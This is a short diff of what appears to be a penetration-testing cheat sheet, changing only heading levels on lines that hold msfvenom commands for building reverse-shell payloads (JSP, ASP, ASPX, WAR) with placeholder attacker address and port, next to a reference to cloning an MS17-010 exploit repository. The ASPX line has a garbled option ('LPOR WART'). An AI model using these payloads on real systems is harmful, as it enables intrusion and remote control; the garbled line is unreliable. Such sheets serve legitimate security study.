@@ -183,10 +183,10 @@ git clone https://github.com/worawit/MS17-010.git
 ##### msfvenom -p java/jsp_shell_reverse_tcp LHOST=\<ip> LPORT=\<port> -f raw > shell.jsp
 
 ### ASP
-###### msfvenom -p windows/shell_reverse_tcp LHOST=\<ip> LPORT=\<port> -f asp > shell.asp
+##### msfvenom -p windows/shell_reverse_tcp LHOST=\<ip> LPORT=\<port> -f asp > shell.asp
 
 ### ASPX
-###### msfvenom -p windows/shell_reverse_tcp LHOST=\<ip> LPOR WART=\<port> -f aspx > shell.aspx
+##### msfvenom -p windows/shell_reverse_tcp LHOST=\<ip> LPOR WART=\<port> -f aspx > shell.aspx
 
 ### WAR
-###### msfvenom -p java/jsp_shell_reverse_tcp LHOST=\<ip> LPORT=\<port> -f war > shell.war
+##### msfvenom -p java/jsp_shell_reverse_tcp LHOST=\<ip> LPORT=\<port> -f war > shell.war
